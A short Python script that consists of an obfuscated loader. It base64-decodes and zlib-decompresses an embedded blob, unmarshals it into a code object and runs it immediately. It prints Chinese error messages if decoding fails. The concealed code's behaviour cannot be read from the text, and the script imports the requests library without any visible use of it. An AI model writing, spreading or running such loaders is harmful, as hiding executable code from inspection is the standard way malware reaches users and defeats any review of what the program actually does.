#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os,sys,json,requests,base64,zlib,marshal,types
from pathlib import Path

_EXEC = b'eJydWGtz2kgS/px8hZ1id/codreA3Vb5ECBbBhhjJCQhQzuVSLKEYgvLJpD/92lJvia32cR7lTPp6f7NdHf3zGi01ZOHLVzgQKDR8eRWHpm+zXp6tN6MJzsz9TdDif83yrS9JY2Jg48Qbq8C2u2LgFimckK3owGdo4W9N3uLPGntbkfWI2DbT8c2233yLkrkA0s+TmY0j2TfroBtD4oEO1Xa/9PlctPbBcQHcun7j8jkKBdAA6iFOiJ9p1d2NsG7Z1b/3InriWP76ZoiSxAaIg+k0WN3gZRa0gaxcQmNAUYgGPxT4BTazUhWJyA4xSJ/RK4LWo0STBOke4RtYBRqGMJogwOWiLWaIAWLqQpxpGNMjiUQhxjow+FDGEEBiUFIsxyNQYQFklomDscQROQxx30AroE8AxyJiOMfq9cJ7VHj+BJ5cKeP3zxNSQExYTdQa+kjgXrWUKK8JMxlMICwIcRtmgbIbGMQMUCSDMEoBAHsUyfiokMhIVm23oYmtR0CQ2UXIQSHFGRszJs8tV2RXYnoiyHSUNvQaWzVMWLYeMk9HNp3m5ilCFmWmXJSx1GKlpRizDEdvzOTUidT7bGYDq95NuHbFhDZmV7QkEYuB+RGWRU4HKdHGWcqZniESYG8te8TEz6yENw+wvGQyuQRNEcqfVCbVHBOaFQ6EdzLdSQMV5FBEUUlOSXCNpU5R71UZIsymkADAFBKmIYfgb5MKvGFeDIbSoVNUolpLgUQRyRMTB4F4VMpm8rYv/SRsmS5PqIZ5RGWY7BIFaG0sV4bw72TWNf8d021omNSMMmMeoXJInm399BGKmmDULR4S3NE8trUxR0SZUStWkQEhaSctGZENWpZ/ox1urSrVHAjL6N6hTwkrM1Yg4vel7Q5mYo1IqvMhkWYlDUsbSbqUOlY6J2qIMpKoj2qseRZMnF2p//eP71r/7e8fb692xwvZlfLh91/F2/nF7c3i8XDar2+WZxfTr+Pd2HIXq5uvt99H/S+/I9OGAHAdZR6W7Wc23D73F4tH+Ldtyfgr5Y/y9+uZ9fvL5cMvv28j/7rx2Bnj+NV+P7t/fb98ucfRrKcL25uwil8eVo95pPdnjK4iZ+bPrB/v4MXbxcrbw8/AIOfjU0bjr+rThh4P86exkvztjV/PC+XK/vXsG+GeXxZ/P4iZ6vndXO2CJ53RwN/9vxyXxnh7f5p4VxMq7Dd2G3wFNy7b+/zryg37oPv7+3N59MP52brHdfvH/3odHh4uTkv1xmYnbP22VmdC+bVZb5N6/y/Hp9+duO6Mte7n1fr9cv7y3+2YZ3TLPp2+nQH47m2Bjj2N+YcPV4wM8fDyV4XGhz1s7B/W2vDIM48uWHm0eXr89vX2z/fPp6e5sG/1tc+fH5+mX9/210/hUvYh6eXoP1+9D9+Pa43P59Xq/3HXzuY6Kt/W6W2R/L+9S/v65vHh7/T1Qnq+1v9iyWz9FfZ+A/suRXTgzqF9rC//d9dR6K6h7X9B0fS/43D/2qjfL3jv6zyL7jP9hX3/9lG4P8BmKXrXA==' 

def _run():
    try:
        _d = base64.b64decode(_EXEC)
        _d = zlib.decompress(_d)
        _c = marshal.loads(_d)
        _main = types.FunctionType(_c, globals(), '_main')
        return _main
    except Exception as e:
        print(f"❌ 解密失败: {e}")
        return None

_main = _run()
if _main:
    _main()
else:
    print("❌ 脚本启动失败")
    sys.exit(1)
